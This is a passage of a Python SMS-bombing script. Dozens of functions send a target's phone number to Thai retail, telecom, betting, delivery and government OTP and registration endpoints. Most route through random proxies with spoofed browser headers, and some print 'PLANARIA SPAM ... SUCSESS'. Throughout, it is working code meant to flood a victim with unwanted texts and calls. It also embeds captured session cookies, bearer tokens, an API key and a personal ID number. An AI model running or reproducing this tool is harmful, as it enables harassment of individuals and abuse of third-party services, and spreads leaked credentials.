      "referer=https%3A%2F%2Fwww.konvy.com%2Fm%2F;PHPSESSID=vnqlo8v638jofnb15arplijj3i;k_privacy_state=true;referer=https%3A%2F%2Fwww.konvy.com%2Fm%2Flogin.php;_gcl_au=1.1.531291202.1661272286;_fbp=fb.1.1661272286002.265391910;_gid=GA1.2.960487052.1661272286;_gat_UA-28072727-2=1;_tt_enable_cookie=1;_ttp=d640ab77-0c19-4578-855d-4fb1ceda3f0a;f34c_new_user_view_count=%7B%22count%22%3A2%2C%22expire_time%22%3A1661358684%7D;_ga_Z9S47GV47R=GS1.1.1661272286.1.1.1661272293.53.0.0;_ga=GA1.2.1347355119.1661272286"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API KONVY SEND SMS TO {phone} SUCSESS")


def smsapixx31(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  session = Session()
  ReqTOKEN = session.get(
    "https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated",
    headers={
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
    }).text
  r = session.post(
    "https://srfng.ais.co.th/login/sendOneTimePW",
    data=
    f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",
    headers={
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
      "Content-Type":
      "application/x-www-form-urlencoded; charset=UTF-8",
      "authorization":
      f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API AIS SEND SMS TO {phone} SUCSESS")


def smsapixx32(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://www.tgfone.com/signin/verifylforgot",
    headers={
      "user-agent":
      generate_user_agent(),
      "content-type":
      "application/x-www-form-urlencoded",
      "accept":
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "cookie":
      "_gcl_au=1.1.491392800.1657955935;_gid=GA1.2.1244336456.1657955937;_fbp=fb.1.1657955937500.30844796;G_ENABLED_IDPS=google;PHPSESSID=d42c517cc5234d40c44310c39e2212d464e2b18a;_ga_1QLSWVZFZ2=GS1.1.1657955937.1.1.1657956238.0;_ga=GA1.2.160165897.1657955937;_gat_gtag_UA_163796127_1=1"
    },
    data=f"forgot_name={phone}",
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API TGFONE SEND SMS TO {phone} SUCSESS")


def smsapixx33(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post('https://api.1112delivery.com/api/v1/otp/create',
                    json={
                      "phonenumber": phone,
                      "language": "th"
                    },
                    headers=header,
                    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(f"PLANARIA SPAM API 1112DELIVERY SEND SMS TO {phone} SUCSESS")
def apis(phone):
  head = {
    "content-type":
    "application/json;charset=UTF-8",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "accept":
    "application/json, text/plain, */*",
    "referer":
    "https://www.carsome.co.th/sell-car?gclsrc=aw.ds&&&utm_source=Google&utm_medium=Search&utm_campaign=TH_C2B_Valuation_SmartPhrase_Core_&utm_term=Search_Core_C2B_TH_Perf_Conv_&utm_content=%E0%B8%A3%E0%B8%96%E0%B8%A1%E0%B8%B7%E0%B8%AD%E0%B8%AA%E0%B8%AD%E0%B8%87%E0%B8%A3%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%96%E0%B8%B9%E0%B8%81&gclid=Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB",
    "cookie":
    "_gcl_au=1.1.1272461332.1638187764;G_ENABLED_IDPS=google;_ga=GA1.3.808434087.1638187769;__lt__cid=10b9db7a-fed7-4a04-99d2-cdf99ccd76b8;_gid=GA1.3.1113186157.1639742520;_fbp=fb.2.1639742521800.1608632439;ajs_anonymous_id=fc77ca54-b140-4d14-a811-9be694d4dcfa;_hjSessionUser_1895262=eyJpZCI6IjJmYTg1NjkzLTIwYWUtNTQ3ZC1iYTgyLTZjMTZhNDE4N2VjOSIsImNyZWF0ZWQiOjE2Mzk3NDI1MjIzMDAsImV4aXN0aW5nIjp0cnVlfQ==;_cc_id=c18b09fbdfdf3183761afb6f7799f21d;panoramaId_expiry=1640349594875;panoramaId=052fccf0cccc27f1f255389082ee16d53938c5a780adb183ac3642512b6c17dc;_clck=18ofz7k|1|exd|0;skylab_deviceId=IuD7oBeC61H6n41Z1FH3ek;_gcl_aw=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gcl_dc=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;amp_893e6b=IuD7oBeC61H6n41Z1FH3ek...1fn7egd40.1fn7egjki.1.3.4;__lt__sid=f6ad8bda-06d0796d;_gac_UA-70043720-5=1.1639853872.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gat_UA-70043720-5=1;_uetsid=23e4ae005f3111ec8d8c79ffb5e7c09b;_uetvid=33f5ca20510d11ec8e1175a84efe64f8;_hjSession_1895262=eyJpZCI6IjY2YWZlZmI0LWMwMDYtNGFkMS1hMWE3LTQ3NDllYmQ2MDNjYSIsImNyZWF0ZWQiOjE2Mzk4NTM4NzU4MDd9;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_hjIncludedInSessionSample=0;_clsk=15fms60|1639853877001|1|1|e.clarity.ms/collect"
  }
  post("https://www.carsome.co.th/website/login/sendSMS",
       proxies={
         "http": "http://" + random.choice(proxy)
       },
       header=head,
       json={
         "username": phone,
         "optType": 0
       }).json()


def api1(phone):
  post(
    'https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "Content-Type":
      "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With":
      "XMLHttpRequest",
      "Cookie":
      "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"
    },
    data=
    f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER"
  )


def apidis(phone):
  post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code",
       header={"User-Agent": useragent},
       data={"phone": phone})


def apitrue(phone):
  post("https://www.theconcert.com/rest/request-otp",
       proxies={"http": "http://" + random.choice(proxy)},
       header={"User-Agent": useragent},
       data={
         'mobile': f"{phone}",
         'country_code': "TH",
         'lang': "th",
         'channel': "call",
         'digit': '4'
       })


def api2(phone):
  post(
    "https://shopgenix.com/api/sms/otp/",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Host": "shopgenix.com",
      "content-length": "37",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "x-requested-with": "XMLHttpRequest",
      "sec-ch-ua-platform": "Android",
      "accept": "application/json, text/javascript, /; q=0.01",
      "origin": "https://shopgenix.com",
      "referer": "https://shopgenix.com/app/5364874/",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty"
    },
    data=f"mobile_country_id=1&mobile={phone}")


def api3(phone):
  session = Session()
  get(
    "https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated",
    headers={
      "User-Agent": useragent
    }).text
  x = session.post(
    "https://srfng.ais.co.th/login/sendOneTimePW",
    proxies={"http": "http://" + random.choice(proxy)},
    data=
    f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",
    headers={
      "User-Agent":
      useragent,
      "Content-Type":
      "application/x-www-form-urlencoded; charset=UTF-8",
      "authorization":
      f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''
    })


def api4(phone):
  post(
    "https://www.nowbet.com/th/api/sendotpth",
    proxies={"http": "http://" + random.choice(proxy)},
    data=f"countryCode=TH&mobileId={phone}&lang=th",
    headers={
      "content-type":
      "application/x-www-form-urlencoded; charset=UTF-8",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
      "cookie":
      "SESS83a7d6b33c387766ae5a70114b602df1=6qfWqbFmub7pFfl%2CIupZdbbW-tlmJiOkDaVeElRTFc7fo3QN;lang=th;_fbp=fb.1.1651112908737.938380324"
    })


def api5(phone):
  post(
    "https://api.ulive.youpik.com/api-base/sms/sendCode",
    proxies={"http": "http://" + random.choice(proxy)},
    data=f"phone={phone}&type=1",
    headers={
      "content-type":
      "application/x-www-form-urlencoded;charset=UTF-8",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36"
    })


def api6(phone):
  post("https://play.gkingbet.com/api/register/sms",
       proxies={"http": "http://" + random.choice(proxy)},
       json={
         "phone": phone,
         "agent_id": 5,
         "country_code": "TH"
       })


def api7(phone):
  ru.post(
    "https://www.tgfone.com/signin/otp_chk_fast",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "accept": "text/html, */*; q=0.01",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "x-requested-with": "XMLHttpRequest",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
      "origin": "https://www.tgfone.com",
      "referer": "https://www.tgfone.com/login"
    },
    data=f"mobile={phone}&type_otp=7")


def api8(phone):
  post(
    "https://www.beauticool.com/?m=request_otp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "x-requested-with": "XMLHttpRequest",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": "Android",
      "origin": "https://www.beauticool.com",
      "referer": "https://www.beauticool.com/m/signup_tel.php",
      "cookie": "PHPSESSID=udogc4sigrtvi4lvkll4g62gp3",
      "cookie": "_ga=GA1.1.1703943258.1663615884",
      "cookie": "trustedsite_visit=1",
      "cookie": "_ga_PZZ327LRJ2=GS1.1.1663615884.1.1.1663615918.0.0.0"
    },
    data=f"tel={phone}")


def api9(phone):
  post(
    "https://api.sa.game/api/Account/SendRegisterVerificationSms",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Accept": "application/json; charset=UTF-8",
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "lobbyId": "23",
      "userDeviceTypeId": "6",
      "sec-ch-ua-platform": "Android",
      "Origin": "https://sa.game",
      "Sec-Fetch-Site": "same-site",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://sa.game/"
    },
    data={
      "countryId": 7,
      "phoneNumber": f"{phone}"
    })


def api10(phone):
  post(
    "https://ufaclub99.com/member/Register/Request_OTP",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "accept": "*/*",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "x-requested-with": "XMLHttpRequest",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
      "origin": "https://ufaclub99.com",
      "referer": "https://ufaclub99.com/member/register",
      "cookie": "ci_session=re834geqv85ugp62u6v88i9n15ub5qin"
    },
    data=f"phonetxt={phone}")


def api11(phone):
  post(
    "https://aff.ufaclub24.org/pin.php",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "origin":
      "https://aff.ufaclub24.org",
      "content-type":
      "application/x-www-form-urlencoded",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
      "accept":
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "referer":
      "https://aff.ufaclub24.org/phoneregis.php?invitekey=41bfd20a38bb1b0bec75acf0845530a7",
      "cookie":
      "PHPSESSID=n6da80gl0j6u7ob1ltlseb5m6p;_ga=GA1.2.18658305.1649308092;_gid=GA1.2.1210153607.1649308092;_gat_gtag_UA_155192447_2=1"
    },
    data=f"invitekey=41bfd20a38bb1b0bec75acf0845530a7&txtTel={phone}")


def api12(phone):
  post(
    "https://ufa8.co/register",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "origin": "https://ufa8.co",
      "content-type": "application/x-www-form-urlencoded",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
      "accept":
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "referer": "https://ufa8.co/register"
    },
    data=
    f"register=1&phone={phone}&password=Kan064402&password2=Kan064402&line=Garenarov"
  )


def api13(phone):
  post(
    "https://topping.truemoveh.com/api/get_request_otp",
    proxies={"http": "http://" + random.choice(proxy)},
    data=f"mobile_number={phone}",
    headers={
      "Accept":
      "application/json, text/plain, /",
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "Content-Type":
      "application/x-www-form-urlencoded",
      "Referer":
      "https://topping.truemoveh.com/otp?callback=/campaign/104",
      "Cookie":
      "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"
    })


def api14(phone):
  post(
    f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}",
    proxies={"http": "http://" + random.choice(proxy)})


def api100(phone):
  post(
    "https://cognito-idp.ap-southeast-1.amazonaws.com/",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "cache-control": "max-age=0",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
      "content-type": "application/x-amz-json-1.1",
      "x-amz-target":
      "AWSCognitoIdentityProviderService.ResendConfirmationCode",
      "x-amz-user-agent": "aws-amplify/0.1.x js",
      "referer": "https://www.bugaboo.tv/members/resetpass/phone"
    },
    json={
      "ClientId": "6g47av6ddfcvi06v4l186c16d6",
      "Username": f"+66{phone[1:]}"
    })


def api15(phone):
  post(
    "https://www.bigthailand.com/authentication-service/user/OTP",
    proxies={"http": "http://" + random.choice(proxy)},
    json={
      "locale": "th",
      "phone": f"+66{phone[1:]}",
      "email": "dkdk@gmail.com",
      "userParams": {
        "buyerName": "ekek ks",
        "activateLink": "www.google.com"
      }
    },
    headers={
      "content-type":
      "application/json",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
      "authorization":
      "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg",
      "cookie":
      "auth.strategy=local;auth._token.local=Bearer%20eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg;_utm_objs=eyJzb3VyY2UiOiJnb29nbGUiLCJtZWRpdW0iOiJjcGMiLCJjYW1wYWlnbiI6ImFkd29yZHMiLCJj%0D%0Ab250ZW50IjoiYWR3b3JkcyIsInRlcm0iOiJhZHdvcmRzIiwidHlwZSI6InJlZmVycmVyIiwidGlt%0D%0AZSI6MTY0MjMyOTM5OTU4NSwiY2hlY2tzdW0iOiJaMjl2WjJ4bExXTndZeTFoWkhkdmNtUnpMVEUy%0D%0ATkRJek1qa3pPVGsxT0RVPSJ9;_pk_ref.564990563.2c0e=%5B%22%22%2C%22%22%2C1642329400%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D;_pk_ses.564990563.2c0e=*;_gcl_au=1.1.833577636.1642329400;_asm_visitor_type=n;_ac_au_gt=1642329406505;cdp_session=1;_asm_uid=637506384;_ga=GA1.2.1026893832.1642329403;_gid=GA1.2.1437369318.1642329403;OptanonConsent=isIABGlobal=false&datestamp=Sun+Jan+16+2022+17%3A36%3A45+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.9.0&hosts=&consentId=e0fe7ec6-3c1e-4aa7-9e72-ecd2ed724416&interactionCount=0&landingPath=https%3A%2F%2Fwww.bigthailand.com%2Fcategory%2F850%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2581%25E0%25B8%25A5%25E0%25B8%25B0%25E0%25B8%2582%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2580%25E0%25B8%25AB%25E0%25B8%25A5%25E0%25B8%25A7%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%3Fgclid%3DCj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0007%3A1;_fbp=fb.1.1642329406623.363807498;_hjSessionUser_2738378=eyJpZCI6ImVkNmZhOGY3LTQwNDctNTNjMi04YTVjLTQ0OGE5MDA4YjhiZCIsImNyZWF0ZWQiOjE2NDIzMjk0MDQ4MDMsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjIncludedInSessionSample=0;_hjSession_2738378=eyJpZCI6ImNhN2UwZDFhLTZkNmQtNGM0Mi04YmI1LTg4NWJmNzZjMGExZCIsImNyZWF0ZWQiOjE2NDIzMjk0MTEwNzcsImluU2FtcGxlIjpmYWxzZX0=;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_gac_UA-165856282-1=1.1642329477.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_gcl_aw=GCL.1642329478.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_pk_id.564990563.2c0e=0.1642329400.1.1642329489.1642329400.;_ac_client_id=637515726.1642329496;_ac_an_session=zmzlzhzlzizqzmzjzkzjzdzlzgzkzmzizmzkzhzlzdzizlznzhzgzhzqznzqzlzdzizdzizlznzhzgzhzqznzqzlzdzizlznzhzgzhzqznzqzlzdzizdzgzjzizdzjzd2h25zdzgzdzezizd;au_id=637515726;_ga_80VN88PBVD=GS1.1.1642329399.1.1.1642329493.44"
    })


def api16(phone):
  get(
    f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=66{phone[1:]}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2",
    proxies={"http": "http://" + random.choice(proxy)})


def api17(phone):
  post(
    "https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",
    proxies={"http": "http://" + random.choice(proxy)},
    json={
      "username": phone,
      "password": "1111a1111A",
      "name": phone,
      "provinceCode": "74",
      "districtCode": "970",
      "subdistrictCode": "8654",
      "zipcode": "94140",
      "siebelCustomerTypeId": "710",
      "locale": "th_TH"
    },
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
    })


def api18(phone):
  post(
    "https://service-api.auto1.co.th/w/user/request-otp-on-register",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "content-type":
      "application/json;charset=UTF-8",
      "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
    },
    json={
      "ConsentFlag": "true",
      "AcceptPolicy": "true",
      "Tel": f"{phone}",
      "OTPId": "",
      "OTP1": "",
      "OTP2": "",
      "OTP3": "",
      "OTP4": "",
      "OTP5": "",
      "OTP6": "",
      "Email": "",
      "Pin1": "",
      "Pin2": "",
      "Pin3": "",
      "Pin4": "",
      "Pin5": "",
      "Pin6": "",
      "PinConfirm1": "",
      "PinConfirm2": "",
      "PinConfirm3": "",
      "PinConfirm4": "",
      "PinConfirm5": "",
      "PinConfirm6": "",
      "FirstName": "",
      "LastName": ""
    })


def api19(phone):
  post(
    "https://login.s-momclub.com/accounts.otp.sendCode",
    proxies={"http": "http://" + random.choice(proxy)},
    data=
    f"phoneNumber=%2B66{phone[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json",
    headers={
      "content-type":
      "application/x-www-form-urlencoded",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
      "cookie":
